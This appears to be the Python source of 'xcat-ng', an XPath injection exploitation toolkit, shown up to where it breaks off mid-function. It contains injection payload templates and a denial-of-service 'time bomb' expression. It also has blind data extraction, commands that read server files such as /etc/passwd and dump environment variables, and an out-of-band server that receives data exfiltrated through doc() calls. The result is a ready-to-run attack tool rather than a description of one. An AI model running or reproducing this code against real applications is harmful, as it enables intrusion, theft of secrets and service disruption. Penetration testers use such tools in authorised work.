#!/usr/bin/env python3
"""xcat-ng v2.1.0 — Modern XPath Injection Exploitation Toolkit
Dependencies: pip install httpx rich prompt_toolkit aiohttp
"""
from __future__ import annotations
import asyncio,argparse,difflib,enum,hashlib,json,math,os,random,re,shlex
import statistics,string,sys,time as _time
from collections import Counter,deque
from dataclasses import dataclass,field
from pathlib import Path
from typing import Any,Callable,Optional,Tuple
from urllib.parse import parse_qs,urlparse,unquote
from xml.sax.saxutils import escape

try: import httpx
except ImportError: sys.exit("[!] pip install httpx")
try:
    from rich.console import Console
    from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn,MofNCompleteColumn
    from rich.table import Table;from rich.panel import Panel;from rich.syntax import Syntax;from rich import box
except ImportError: sys.exit("[!] pip install rich")
try:
    from prompt_toolkit import PromptSession;from prompt_toolkit.history import FileHistory
    from prompt_toolkit.auto_suggest import AutoSuggestFromHistory;from prompt_toolkit.completion import WordCompleter
    HAS_PT=True
except ImportError: HAS_PT=False
try: from aiohttp import web as aio_web;HAS_AIOHTTP=True
except ImportError: HAS_AIOHTTP=False

VERSION="2.1.0";DEFAULT_TIMEOUT=15.0;DEFAULT_CONC=10;MAX_RETRIES=3
ASCII_SS=string.digits+string.ascii_letters+"+./:@_ -,()!;='\"\\<>{}[]|~`#$%^&*?\n\r\t"
MISSING="?";TIME_BOMB="count((//.)[count((//.)[count((//.))>0])>0])"
con=Console(highlight=False)

class Tech(str,enum.Enum):
    AUTO="auto";BOOLEAN="boolean";TIME="time";NORMAL="normal"
class Mode(str,enum.Enum):
    SAFE="safe";AGG="aggressive"

BANNER=r"""[bold cyan]
 ██╗  ██╗ ██████╗ █████╗ ████████╗    ███╗   ██╗ ██████╗
 ╚██╗██╔╝██╔════╝██╔══██╗╚══██╔══╝    ████╗  ██║██╔════╝
  ╚███╔╝ ██║     ███████║   ██║       ██╔██╗ ██║██║  ███╗
  ██╔██╗ ██║     ██╔══██║   ██║       ██║╚██╗██║██║   ██║
 ██╔╝ ██╗╚██████╗██║  ██║   ██║       ██║ ╚████║╚██████╔╝
 ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝       ╚═╝  ╚═══╝ ╚═════╝[/bold cyan]
[dim]  Modern XPath Injection Toolkit  v"""+VERSION+"""[/dim]
"""

# ═══ Models ═══════════════════════════════════════════════════════════════════
@dataclass(slots=True)
class ParsedReq:
    method:str;url:str;headers:dict[str,str];qp:dict[str,str];bp:dict[str,str]
    raw_body:Optional[str]=None;ct:str="application/x-www-form-urlencoded"
    @property
    def all_params(self)->dict[str,str]: return {**self.qp,**self.bp}

@dataclass(slots=True)
class Cfg:
    timeout:float=DEFAULT_TIMEOUT;delay:float=0.0;conc:int=DEFAULT_CONC
    proxy:Optional[str]=None;verify:bool=False;mode:Mode=Mode.SAFE

@dataclass(slots=True)
class XmlNode:
    name:str;value:Optional[str]=None;attrs:dict[str,str]=field(default_factory=dict)
    children:list["XmlNode"]=field(default_factory=list);comments:list[str]=field(default_factory=list)
    def to_xml(self,ind:int=0)->str:
        p="  "*ind;a="".join(f' {k}="{escape(v)}"' for k,v in self.attrs.items());parts=[]
        if self.children:
            parts.append(f"{p}<{self.name}{a}>")
            for c in self.comments:parts.append(f"{p}  <!--{escape(c)}-->")
            if self.value:parts.append(f"{p}  {escape(self.value)}")
            for ch in self.children:parts.append(ch.to_xml(ind+1))
            parts.append(f"{p}</{self.name}>")
        else:
            t=escape(self.value) if self.value else ""
            if self.comments:
                parts.append(f"{p}<{self.name}{a}>")
                for c in self.comments:parts.append(f"{p}  <!--{escape(c)}-->")
                if t:parts.append(f"{p}  {t}")
                parts.append(f"{p}</{self.name}>")
            elif t:parts.append(f"{p}<{self.name}{a}>{t}</{self.name}>")
            else:parts.append(f"{p}<{self.name}{a}/>")
        return "\n".join(parts)

@dataclass(slots=True)
class SaveState:
    partial:dict[str,str]=field(default_factory=dict)
    def save(self,p:str):
        with open(p,"w") as f:json.dump(self.partial,f,indent=2)
    @staticmethod
    def load(p:str)->"SaveState":
        with open(p) as f:return SaveState(partial=json.load(f))

# ═══ Utils ════════════════════════════════════════════════════════════════════
def sim(a:str,b:str)->float: return difflib.SequenceMatcher(None,a,b).ratio()
def strip_html(h:str)->str: return re.sub(r"\s+"," ",re.sub(r"<[^>]+>"," ",h)).strip()
def entropy(t:str)->float:
    if not t:return 0.0
    f={};n=len(t)
    for c in t:f[c]=f.get(c,0)+1
    return -sum((v/n)*math.log2(v/n) for v in f.values())

# ═══ Burp Parser ═════════════════════════════════════════════════════════════
def parse_burp(path:str,https:bool=False)->ParsedReq:
    raw=Path(path).read_text(errors="replace");lines=raw.splitlines()
    if not lines:raise ValueError("Empty")
    m=re.match(r"^(GET|POST|PUT|PATCH|DELETE|OPTIONS|HEAD)\s+(\S+)\s+HTTP/",lines[0],re.I)
    if not m:raise ValueError(f"Bad request line: {lines[0]!r}")
    method=m.group(1).upper();pqs=m.group(2)
    hdr:dict[str,str]={};host="";ct="application/x-www-form-urlencoded"
    i=1
    while i<len(lines) and lines[i].strip():
        if ":" in lines[i]:
            k,_,v=lines[i].partition(":");kl=k.strip().lower()
            hdr[k.strip()]=v.strip()
            if kl=="host":host=v.strip()
            elif kl=="content-type":ct=v.strip()
        i+=1
    body="\n".join(lines[i+1:]).strip() if i+1<len(lines) else ""
    sc="https" if(https or "443" in host.split(":")[-1:]) else "http"
    pu=urlparse(f"{sc}://{host}{pqs}")
    qp={k:v[0] for k,v in parse_qs(pu.query,keep_blank_values=True).items()}
    bp:dict[str,str]={}
    if body:
        if "urlencoded" in ct:bp={k:v[0] for k,v in parse_qs(body,keep_blank_values=True).items()}
        elif "json" in ct:
            try:
                j=json.loads(body)
                if isinstance(j,dict):bp={k:str(v) for k,v in j.items()}
            except:pass
    base=f"{pu.scheme}://{pu.netloc}{pu.path}"
    return ParsedReq(method=method,url=base,headers=hdr,qp=qp,bp=bp,raw_body=body or None,ct=ct)

def build_manual(url:str,method:str="GET",data:Optional[str]=None,headers:Optional[list[str]]=None,jbody:Optional[str]=None)->ParsedReq:
    pu=urlparse(url);qp={k:v[0] for k,v in parse_qs(pu.query,keep_blank_values=True).items()}
    bp:dict[str,str]={};rb=None;ct="application/x-www-form-urlencoded"
    if jbody:
        rb=jbody;ct="application/json"
        try:
            j=json.loads(jbody)
            if isinstance(j,dict):bp={k:str(v) for k,v in j.items()}
        except:pass
    elif data:rb=data;bp={k:v[0] for k,v in parse_qs(data,keep_blank_values=True).items()}
    hd:dict[str,str]={}
    if headers:
        for h in headers:
            if ":" not in h:raise ValueError(f"Bad header: {h}")
            k,v=h.split(":",1);hd[k.strip()]=v.strip()
    base=f"{pu.scheme}://{pu.netloc}{pu.path}"
    return ParsedReq(method=method.upper(),url=base,headers=hd,qp=qp,bp=bp,raw_body=rb,ct=ct)

# ═══ HTTP Engine ══════════════════════════════════════════════════════════════
class Engine:
    def __init__(self,req:ParsedReq,cfg:Cfg):
        self.req=req;self.cfg=cfg;self.n=0;self._c:Optional[httpx.AsyncClient]=None
    async def _cli(self)->httpx.AsyncClient:
        if self._c is None or self._c.is_closed:
            tk:dict[str,Any]={"retries":2}
            if self.cfg.proxy:
                try:tk["proxy"]=self.cfg.proxy
                except TypeError:pass
            try:tr=httpx.AsyncHTTPTransport(**tk)
            except TypeError:tr=httpx.AsyncHTTPTransport(retries=2)
            self._c=httpx.AsyncClient(timeout=httpx.Timeout(self.cfg.timeout),verify=self.cfg.verify,transport=tr,follow_redirects=True)
        return self._c
    async def close(self):
        if self._c and not self._c.is_closed:await self._c.aclose()
    async def send(self,ov:Optional[dict[str,str]]=None)->Tuple[str,float,int]:
        c=await self._cli();ov=ov or {}
        qp={**self.req.qp};bp={**self.req.bp}
        for k,v in ov.items():
            if k in qp:qp[k]=v
            elif k in bp:bp[k]=v
            elif bp:bp[k]=v
            elif qp:qp[k]=v
            elif self.req.method=="GET":qp[k]=v
            else:bp[k]=v
        qp["_x"]=str(random.randint(100000,999999))
        hdr={**self.req.headers};hdr.pop("Content-Length",None);hdr.pop("content-length",None)
        try:
            if self.req.method=="GET":r=await c.get(self.req.url,params=qp,headers=hdr)
            elif "json" in self.req.ct and bp:r=await c.request(self.req.method,self.req.url,params=qp,json=bp,headers=hdr)
            else:r=await c.request(self.req.method,self.req.url,params=qp,data=bp if bp else self.req.raw_body,headers=hdr)
            self.n+=1
            if r.status_code==429:await asyncio.sleep(float(r.headers.get("Retry-After","3")));return await self.send(ov)
            if self.cfg.delay>0:await asyncio.sleep(self.cfg.delay)
            return r.text,r.elapsed.total_seconds(),r.status_code
        except(httpx.RequestError,httpx.HTTPStatusError):return "",0.0,0

# ═══ Injection Templates ═════════════════════════════════════════════════════
# (name, [(true_tpl, false_tpl)], extraction_template)
# {W}=working value, {E}=xpath boolean expression
INJ_TPL:list[tuple[str,list[tuple[str,str]],str]]=[
    ("int-and",[("{W} and 1=1","{W} and 1=2")],"{W} and {E}"),
    ("int-or",[("{W} or 1=1","{W} or 1=2")],"{W} or {E}"),
    ("sq-and",[("{W}' and '1'='1","{W}' and '1'='2")],"{W}' and {E} and '1'='1"),
    ("sq-or",[("{W}' or '1'='1","{W}' or '1'='2")],"{W}' or {E} and '1'='1"),
    ("dq-and",[('{W}" and "1"="1','{W}" and "1"="2')],'{W}" and {E} and "1"="1'),
    ("dq-or",[('{W}" or "1"="1','{W}" or "1"="2')],'{W}" or {E} and "1"="1'),
    ("psq-and",[("{W}') and true() and ('1'='1","{W}') and false() and ('1'='1")],"{W}') and {E} and ('1'='1"),
    ("psq-or",[("{W}') or true() or ('1'='2","{W}') and false() and ('1'='1")],"{W}') or {E} and ('1'='1"),
    ("pdq-and",[("{W}\") and true() and (\"1\"=\"1","{W}\") and false() and (\"1\"=\"1")],"{W}\") and {E} and (\"1\"=\"1"),
    ("pdq-or",[("{W}\") or true() or (\"1\"=\"2","{W}\") and false() and (\"1\"=\"1")],"{W}\") or {E} and (\"1\"=\"1"),
    ("union-sq",[("{W}') and false()] | //*[true() and ('1'='1","{W}') and false()] | //*[false() and ('1'='1")],"{W}') and false()] | //*[{E} and ('1'='1"),
    ("attr-pre",[("1=1 and {W}","1=2 and {W}")],"{E} and {W}"),
    ("attr-post",[("{W} and not 1=2 and {W}","{W} and 1=2 and {W}")],"{W} and {E} and {W}"),
    ("elem-pre",[(".[true()]/{W}",".[false()]/{W}")],".[{E}]/{W}"),
    ("elem-post",[("{W}[true()]","{W}[false()]")],"{W}[{E}]"),
]

@dataclass(slots=True)
class Inj:
    name:str;tpl:str;param:str;wv:str
    def pay(self,e:str)->str:return self.tpl.replace("{W}",self.wv).replace("{E}",e)

# ═══ Features ════════════════════════════════════════════════════════════════
FEATS=[("xpath-2",["lower-case('A')='a'","ends-with('thetest','test')","encode-for-uri('test')='test'"]),
    ("xpath-3",["boolean(generate-id(/))"]),("normalize-space",["normalize-space('  a  b ')='a b'"]),
    ("substring-search",[f"string-length(substring-before('{ASCII_SS[:70]}','h'))={ASCII_SS[:70].find('h')}"]),
    ("codepoint-search",["string-to-codepoints('test')[1]=116"]),
    ("environment-variables",["exists(available-environment-variables())"]),
    ("document-uri",["document-uri(/)"]),("base-uri",["base-uri()"]),
    ("current-datetime",["string(current-dateTime())"]),
    ("unparsed-text",["unparsed-text-available(document-uri(/))"]),
    ("doc-function",["doc-available(document-uri(/))"]),("linux",["unparsed-text-available('/etc/passwd')"])]

async def detect_feats(oracle)->{str:bool}:
    d={}
    for fn,ts in FEATS:
        r=[]
        for t in ts:
            try:r.append(await oracle.ask(t))
            except:r.append(False)
        d[fn]=all(r)
    return d

# ═══ Oracle ══════════════════════════════════════════════════════════════════
class Oracle:
    def __init__(self,eng:Engine,inj:Inj):self.eng=eng;self.inj=inj
    async def ask(self,c:str)->bool:raise NotImplementedError

class BoolOracle(Oracle):
    def __init__(self,eng,inj,mfn=None,th="",fh="",mode=Mode.SAFE):
        super().__init__(eng,inj);self.mfn=mfn;self.th=th;self.fh=fh;self.mode=mode
    async def ask(self,c:str)->bool:
        p=self.inj.pay(c)
        if self.mfn:
            html,_,st=await self.eng.send({self.inj.param:p})
            result=self.mfn(st,html)
            if self.mode==Mode.AGG:return result
            # Safe: only re-check if first result might be flaky (rare)
            # For match_fn, one check is usually enough since it's deterministic
            return result
        # Auto-similarity: single request, retry only if ambiguous
        html,_,_=await self.eng.send({self.inj.param:p})
        st=sim(self.th,html);sf=sim(self.fh,html)
        diff=abs(st-sf)
        if diff>0.05 or self.mode==Mode.AGG:
            return st>sf
        # Ambiguous — do 2 more votes
        votes=1 if st>sf else 0
        for _ in range(2):
            html,_,_=await self.eng.send({self.inj.param:p})
            if sim(self.th,html)>sim(self.fh,html):votes+=1
        return votes>=2

class TimeOracle(Oracle):
    def __init__(self,eng,inj,thr,mode=Mode.SAFE):
        super().__init__(eng,inj);self.thr=thr;self.mode=mode
    async def ask(self,c:str)->bool:
        w=f"({c}) and {TIME_BOMB}>0";p=self.inj.pay(w)
        att=1 if self.mode==Mode.AGG else MAX_RETRIES
        ts=[]
        for _ in range(att):_,t,_=await self.eng.send({self.inj.param:p});ts.append(t)
        return statistics.mean(ts)>self.thr

# ═══ Match function ══════════════════════════════════════════════════════════
def make_match(tc=None,ts=None,fs=None):
    if not tc and not ts and not fs:return None
    nc=False;ec=None
    if tc:
        if tc.startswith("!"):nc=True;tc=tc[1:]
        ec=int(tc)
    ns=False;es=None
    if ts:
        if ts.startswith("!"):ns=True;ts=ts[1:]
        es=ts
    efs=fs
    def m(status,body):
        ok=True
        if ec is not None:ok=ok and((status!=ec)if nc else(status==ec))
        if es is not None:ok=ok and((es not in body)if ns else(es in body))
        if efs is not None:ok=ok and(efs not in body)
        return ok
    return m

# ═══ Detection ═══════════════════════════════════════════════════════════════
def rank_p(p):return sorted(p.keys(),key=lambda k:(p[k].isdigit(),-len(p[k]),k.lower()))

async def detect_inj(eng,param,wv,mfn=None):
    bl,_,bs=await eng.send({})
    for name,tests,tpl in INJ_TPL:
        ok=True;lth="";lfh=""
        for tt,ft in tests:
            tp=tt.replace("{W}",wv);fp=ft.replace("{W}",wv)
            th,_,ts=await eng.send({param:tp});fh,_,fs=await eng.send({param:fp})
            lth=th;lfh=fh
            if mfn:
                if not(mfn(ts,th) and not mfn(fs,fh)):ok=False;break
            else:
                st=sim(bl,th);sf=sim(bl,fh);m=0
                if st>sf+0.05:m+=1
                if abs(len(th)-len(fh))>10:m+=1
                if abs(entropy(th)-entropy(fh))>0.02:m+=1
                if hashlib.sha256(th.encode()).hexdigest()!=hashlib.sha256(fh.encode()).hexdigest():m+=1
                if m<3:ok=False;break
        if ok:return Inj(name=name,tpl=tpl,param=param,wv=wv),lth,lfh
    return None

async def detect_time(eng,param,wv):
    for name,tests,tpl in INJ_TPL:
        for tt,ft in tests:
            bomb=tt.replace("{W}",wv).replace("1=1",f"1=1 and {TIME_BOMB}>0").replace("true()",f"true() and {TIME_BOMB}>0")
            fp=ft.replace("{W}",wv)
            tts=[];fts=[]
            for _ in range(5):_,t,_=await eng.send({param:bomb});tts.append(t)
            for _ in range(5):_,t,_=await eng.send({param:fp});fts.append(t)
            mt=statistics.mean(tts);mf=statistics.mean(fts)
            sd=statistics.stdev(fts)if len(fts)>1 else 0.01
            if sd==0:sd=0.01
            if(mt-mf)/sd>3 and mt>mf+0.3:
                return Inj(name=f"{name}(time)",tpl=tpl,param=param,wv=wv),(mt+mf)/2
    return None

async def detect_normal(eng,params):
    pl=list(params.keys());nps=["' and '1'='2","') and ('1'='2","\" and \"1\"=\"2"]
    for ip in pl:
        for np in nps:
            nh,_,_=await eng.send({ip:np});nl=len(nh)
            for p2 in pl:
                if p2==ip:continue
                h,_,_=await eng.send({ip:np,p2:f"{params[p2]} | /*[1]"})
                if len(h)>nl+10:return{"ip":ip,"np2":p2,"npl":np}
    return None

async def auto_detect(eng,params,tech,mfn=None,target=None,cfg=Cfg()):
    pl=[target]if target else rank_p(params)
    if tech in(Tech.AUTO,Tech.NORMAL)and len(params)>=2:
        r=await detect_normal(eng,params)
        if r:return Tech.NORMAL,None,r
    for p in pl:
        wv=params.get(p,"")
        con.print(f"  [dim]Testing:[/dim] [yellow]{p}[/yellow] = [dim]{wv!r}[/dim]")
        if tech in(Tech.AUTO,Tech.BOOLEAN):
            d=await detect_inj(eng,p,wv,mfn)
            if d:
                inj,th,fh=d
                con.print(f"  [green]✓[/green] Boolean: [bold]{inj.name}[/bold] on [yellow]{p}[/yellow]")
                return Tech.BOOLEAN,BoolOracle(eng,inj,mfn,th=th,fh=fh,mode=cfg.mode),None
        if tech in(Tech.AUTO,Tech.TIME):
            d=await detect_time(eng,p,wv)
            if d:
                inj,thr=d
                con.print(f"  [green]✓[/green] Time: [bold]{inj.name}[/bold] on [yellow]{p}[/yellow] (thr={thr:.2f}s)")
                return Tech.TIME,TimeOracle(eng,inj,thr,mode=cfg.mode),None
    if tech==Tech.NORMAL:
        con.print("  [yellow]Normal not found, trying boolean...[/yellow]")
        for p in pl:
            d=await detect_inj(eng,p,params.get(p,""),mfn)
            if d:
                inj,th,fh=d
                con.print(f"  [green]✓[/green] Boolean: [bold]{inj.name}[/bold] on [yellow]{p}[/yellow]")
                return Tech.BOOLEAN,BoolOracle(eng,inj,mfn,th=th,fh=fh,mode=cfg.mode),None
    return None,None,None

# ═══ Normal Extraction ═══════════════════════════════════════════════════════
class NormExt:
    def __init__(self):self.mode="auto";self.rx=None;self.nh="";self.nt=""
    def cal(self,nh,ph):
        self.nh=nh;self.nt=strip_html(nh)
        for p in[r"<td[^>]*>(.*?)</td>",r"<span[^>]*>(.*?)</span>",r"<p[^>]*>(.*?)</p>",r"<div[^>]*>(.*?)</div>"]:
            m=re.search(p,ph,re.I|re.DOTALL)
            if m:self.mode="regex";self.rx=p;return
        self.mode="diff"
    def ext(self,html):
        if not html:return None
        if self.mode=="regex"and self.rx:
            m=re.search(self.rx,html,re.I|re.DOTALL)
            if m:v=strip_html(m.group(1));return v if v else None
        s=strip_html(html);bw=set(self.nt.split());d=[w for w in s.split()if w not in bw]
        return " ".join(d)if d else None

async def normal_extract(eng,info):
    ip=info["ip"];np=info["np2"];npl=info["npl"]
    ext=NormExt();nh,_,_=await eng.send({ip:npl})
    ph,_,_=await eng.send({ip:npl,np:f"dummy | /*[1]"});ext.cal(nh,ph)
    results=[];queue=deque([["/*[1]"]])
    with Progress(SpinnerColumn(),TextColumn("[bold blue]{task.description}"),BarColumn(),MofNCompleteColumn(),TimeElapsedColumn(),console=con)as prog:
        t=prog.add_task("Normal BFS",total=None)
        while queue:
            path=queue.popleft();xp="".join(path)
            h,_,_=await eng.send({ip:npl,np:f"dummy | {xp}"});v=ext.ext(h)
            if not v and len(h)<len(nh)+5:prog.advance(t);continue
            if v:results.append((xp,v));prog.console.print(f"  [green]→[/green] {xp} = [cyan]{v}[/cyan]")
            if len(path)<8:
                for i in range(1,21):queue.append(path+[f"/*[{i}]"])
            prog.advance(t)
    return[XmlNode(name=xp,value=val)for xp,val in results]

# ═══ Blind Extractor (with inline string progress) ═══════════════════════════
class Blind:
    def __init__(self,oracle,feats,conc=10,mode=Mode.SAFE):
        self.o=oracle;self.f=feats;self.conc=conc*2 if mode==Mode.AGG else conc
        self.mode=mode;self.cs=list(ASCII_SS);self.cstr=Counter();self.cchr=Counter()
        self._sem=asyncio.Semaphore(self.conc)

    async def bs(self,expr,lo=0,hi=25):
        while await self.o.ask(f"{expr}>{hi}"):
            hi*=2
            if hi>100000:return-1
        while lo<=hi:
            mid=(lo+hi)//2
            if await self.o.ask(f"{expr}>{mid}"):lo=mid+1
            elif await self.o.ask(f"{expr}<{mid}"):hi=mid-1
            else:return mid
        return lo

    async def count(self,e):return await self.bs(f"count({e})")
    async def strlen(self,e):return await self.bs(f"string-length({e})")

    async def char_cp(self,e):
        cp=await self.bs(f"string-to-codepoints({e})",0,255)
        return chr(cp)if cp>0 else None

    async def char_ss(self,e):
        sp=ASCII_SS[:70]
        if await self.o.ask(f"{e}='{sp[0]}'"):return sp[0]
        idx=await self.bs(f"string-length(substring-before('{sp}',{e}))",0,len(sp))
        return sp[idx]if 0<idx<len(sp)else None

    async def char_bf(self,e):
        top=[c for c,_ in self.cchr.most_common()]
        search=top+[c for c in self.cs if c not in top]
        for ch in search:
            q='"'if ch=="'"else"'"
            cond=f"{e}={q}{ch}{q}"
            if self.mode==Mode.AGG:
                if await self.o.ask(cond):self.cchr[ch]+=1;return ch
            else:
                v=0
                for _ in range(MAX_RETRIES):
                    if await self.o.ask(cond):v+=1
                if v>=2:self.cchr[ch]+=1;return ch
        return MISSING

    async def char(self,e):
        if self.f.get("codepoint-search"):
            r=await self.char_cp(e)
            if r:self.cchr[r]+=1;return r
        if self.f.get("substring-search"):
            r=await self.char_ss(e)
            if r:self.cchr[r]+=1;return r
        return await self.char_bf(e)

    async def get_string(self,expr,label="",normalize=True):
        if normalize and self.f.get("normalize-space"):expr=f"normalize-space({expr})"
        length=await self.strlen(expr)
        if length<=0:return""
        lbl=label or expr[:40];w=len(str(length))
        # common strings
        if length<=10:
            for cand,_ in self.cstr.most_common():
                if len(cand)!=length:continue
                q='"'if"'"in cand else"'"
                if await self.o.ask(f"{expr}={q}{cand}{q}"):
                    self.cstr[cand]+=1
                    con.print(f"    [dim][{length:>{w}}/{length}][/dim] [green]{cand}[/green] [dim]@ {lbl}[/dim]")
                    return cand
        result=[MISSING]*length
        def show():
            done=sum(1 for c in result if c!=MISSING);cur="".join(result)
            sys.stdout.write(f"\r    [{done:>{w}}/{length}] {cur} @ {lbl}  ")
            sys.stdout.flush()
        show()
        async def fetch(pos):
            async with self._sem:
                ch=await self.char(f"substring({expr},{pos},1)")
                result[pos-1]=ch;show()
        await asyncio.gather(*(fetch(i)for i in range(1,length+1)))
        final="".join(result)
        sys.stdout.write(f"\r    [{length:>{w}}/{length}] {final} @ {lbl}  \n")
        sys.stdout.flush()
        if length<=10:self.cstr[final]+=1
        return final

# ═══ XML Tree Extraction ═════════════════════════════════════════════════════
async def extract_xml(ex,xp="/*[1]",depth=0,maxd=15,state=None,sp=None):
    if state and xp in state.partial:
        c=json.loads(state.partial[xp]);return XmlNode(name=c["name"],value=c.get("value"))
    name=await ex.get_string(f"name({xp})",label=xp)
    if not name:name="unknown"
    node=XmlNode(name=name)
    pad="  "*(depth+1)
    # attrs
    ac=await ex.count(f"{xp}/@*")
    for i in range(1,ac+1):
        an=await ex.get_string(f"name({xp}/@*[{i}])",label=f"@attr[{i}]")
        av=await ex.get_string(f"{xp}/@*[{i}]",label=f"@{an}")
        node.attrs[an]=av
    # comments
    cc=await ex.count(f"{xp}/comment()")
    for i in range(1,cc+1):node.comments.append(await ex.get_string(f"{xp}/comment()[{i}]",label=f"comment[{i}]"))
    # children
    nc=await ex.count(f"{xp}/*")
    if nc==0 or depth>=maxd:
        # Leaf — get text value
        val=await ex.get_string(xp,label=f"{xp}(text)")
        # Strip whitespace-only values
        node.value=val if val and val.strip() else None
    else:
        # Branch — show count and recurse, skip whitespace text() nodes
        con.print(f"  {pad}[bold cyan]<{name}>[/bold cyan] [dim]({nc} children)[/dim]")
        for i in range(1,nc+1):
            node.children.append(await extract_xml(ex,f"{xp}/*[{i}]",depth+1,maxd,state,sp))
    if state and sp:state.partial[xp]=json.dumps({"name":node.name,"value":node.value});state.save(sp)
    return node

# ═══ OOB Server ══════════════════════════════════════════════════════════════
class OOB:
    def __init__(self,host,port):
        if not HAS_AIOHTTP:raise RuntimeError("pip install aiohttp")
        self.host=host;self.port=port;self.tv=str(random.randint(1,1000000))
        self.exp={};self.ev={};self._r=None;self.app=None
    def _mk(self):
        app=aio_web.Application()
        app.router.add_get("/test/data",self._ht)
        app.router.add_get("/data/{id}",self._hd)
        app["s"]=self;return app
    async def _ht(self,r):return aio_web.Response(body=f"<data>{self.tv}</data>",content_type="text/xml")
    async def _hd(self,r):
        eid=r.match_info["id"]
        if eid not in self.exp:return aio_web.Response(status=404)
        d=unquote(r.rel_url.query_string[2:])if r.rel_url.query_string.startswith("d=")else""
        f=self.exp[eid]
        if not f.done():f.set_result(d)
        return aio_web.Response(body=f"<data>{self.tv}</data>",content_type="text/xml")
    def expect(self):
        eid=str(len(self.exp));f=asyncio.get_event_loop().create_future();self.exp[eid]=f;return eid,f
    async def start(self):
        self.app=self._mk();self._r=aio_web.AppRunner(self.app);await self._r.setup()
        await aio_web.TCPSite(self._r,"0.0.0.0",self.port).start()
        con.print(f"  [green]✓[/green] OOB on 0.0.0.0:{self.port}")
    async def stop(self):
        if self._r:await self._r.cleanup()
    @property
    def base(self):return f"http://{self.host}:{self.port}"

async def oob_get_string(oracle,oob,expr):
    """Retrieve a string via OOB doc() exfiltration."""
    eid,fut=oob.expect()
    url=f"{oob.base}/data/{eid}?d="
    oob_expr=f"doc(concat('{url}',encode-for-uri({expr})))/data='{oob.tv}'"
    if not await oracle.ask(oob_expr):return None
    try:return await asyncio.wait_for(fut,timeout=5)
    except asyncio.TimeoutError:return None

# ═══ Shell ═══════════════════════════════════════════════════════════════════
class Cmd:
    name="";help="";args_d=[];req_f=frozenset()
    def __init__(self,ctx):self.ctx=ctx
    async def run(self,a):raise NotImplementedError

class ShCtx:
    def __init__(self,o,ex,f,oob=None):self.o=o;self.ex=ex;self.f=f;self.oob=oob

class CHelp(Cmd):
    name="help";help="Show commands"
    async def run(self,a):
        t=Table(title="Commands",box=box.SIMPLE);t.add_column("Cmd",style="green");t.add_column("Description")
        for c in Cmd.__subclasses__():t.add_row(c.name,c.help)
        con.print(t)
class CExit(Cmd):
    name="exit";help="Exit"
    async def run(self,a):raise SystemExit(0)
class CGet(Cmd):
    name="get";help="Extract subtree";args_d=["xpath"]
    async def run(self,a):
        if not a:con.print("[red]Usage: get <xpath>[/red]");return
        n=await extract_xml(self.ctx.ex,a[0]);con.print(Syntax(n.to_xml(),"xml",theme="monokai"))
class CGStr(Cmd):
    name="get-string";help="Get XPath string";args_d=["expr"]
    async def run(self,a):
        if not a:con.print("[red]Usage: get-string <expr>[/red]");return
        con.print(f"[cyan]{await self.ctx.ex.get_string(a[0],label=a[0])}[/cyan]")
class CCount(Cmd):
    name="count";help="Count nodes";args_d=["expr"]
    async def run(self,a):
        if not a:con.print("[red]Usage: count <expr>[/red]");return
        con.print(f"[cyan]{await self.ctx.ex.count(a[0])}[/cyan]")
class CCheck(Cmd):
    name="check";help="Test condition";args_d=["cond"]
    async def run(self,a):
        if not a:con.print("[red]Usage: check <cond>[/red]");return
        r=await self.ctx.o.ask(a[0]);con.print(f"[{'green'if r else'red'}]{r}[/]")
class CPwd(Cmd):
    name="pwd";help="Working directory";req_f=frozenset({"document-uri","base-uri"})
    async def run(self,a):
        e="base-uri()"if self.ctx.f.get("base-uri")else"document-uri(/)"
        con.print(f"[cyan]{await self.ctx.ex.get_string(e,label='pwd')}[/cyan]")
class CCat(Cmd):
    name="cat";help="Read file";args_d=["path"];req_f=frozenset({"unparsed-text"})
    async def run(self,a):
        if not a:con.print("[red]Usage: cat <path>[/red]");return
        p=a[0];c=await self.ctx.ex.count(f"unparsed-text-lines('{p}')")
        con.print(f"[dim]Lines: {c}[/dim]")
        for i in range(1,c+1):con.print(await self.ctx.ex.get_string(f"unparsed-text-lines('{p}')[{i}]",label=f"line{i}",normalize=False))
class CEnv(Cmd):
    name="env";help="Environment vars";req_f=frozenset({"environment-variables"})
    async def run(self,a):
        t=await self.ctx.ex.count("available-environment-variables()")
        for i in range(1,t+1):
            n=await self.ctx.ex.get_string(f"available-environment-variables()[{i}]",label=f"env[{i}]")
            v=await self.ctx.ex.get_string(f"environment-variable(available-environment-variables()[{i}])",label=n)
            con.print(f"[green]{n}[/green]=[cyan]{v}[/cyan]")
class CTime(Cmd):
    name="time";help="Server time";req_f=frozenset({"current-datetime"})
    async def run(self,a):con.print(f"[cyan]{await self.ctx.ex.get_string('string(current-dateTime())',label='time')}[/cyan]")
class CFeats(Cmd):
    name="features";help="Show features"
    async def run(self,a):
        for f,e in self.ctx.f.items():con.print(f"  {f}: [{'green'if e else'red'}]{e}[/]")
class CFind(Cmd):
    name="find";help="Find file in parent dirs";args_d=["filename"];req_f=frozenset({"doc-function"})
    async def run(self,a):
        if not a:con.print("[red]Usage: find <filename>[/red]");return
        nm=a[0]
        for i in range(10):
            rel=("../"*i)+nm;con.print(f"[dim]Searching: {rel}[/dim]")
            e=f"resolve-uri('{rel}',document-uri(/))"
            if await self.ctx.o.ask(f"doc-available({e})"):con.print(f"  [green]✓ XML: {rel}[/green]")
            elif self.ctx.f.get("unparsed-text") and await self.ctx.o.ask(f"unparsed-text-available({e})"):con.print(f"  [green]✓ Text: {rel}[/green]")
class CToggle(Cmd):
    name="toggle";help="Toggle feature";args_d=["name"]
    async def run(self,a):
        if not a:await CFeats(self.ctx).run([]);return
        self.ctx.f[a[0]]=not self.ctx.f.get(a[0],False)
        con.print(f"  {a[0]} → {'on'if self.ctx.f[a[0]]else'off'}")

async def run_shell(ctx):
    cmds={};
    for c in Cmd.__subclasses__():cmds[c.name]=c(ctx)
    if HAS_PT:
        dd=Path.home()/".xcat_ng";dd.mkdir(exist_ok=True)
        s=PromptSession(history=FileHistory(str(dd/"history")));comp=WordCompleter(list(cmds.keys()))
        while True:
            try:ui=await s.prompt_async("xcat-ng> ",completer=comp,auto_suggest=AutoSuggestFromHistory())
            except(EOFError,KeyboardInterrupt):break
            ps=shlex.split(ui)if ui.strip()else[]
            if not ps:continue
            n,a=ps[0],ps[1:]
            if n not in cmds:con.print(f"[red]Unknown: {n}[/red]");continue
            try:await cmds[n].run(a)
            except SystemExit:return
            except Exception as e:con.print(f"[red]{e}[/red]")
    else:
        while True:
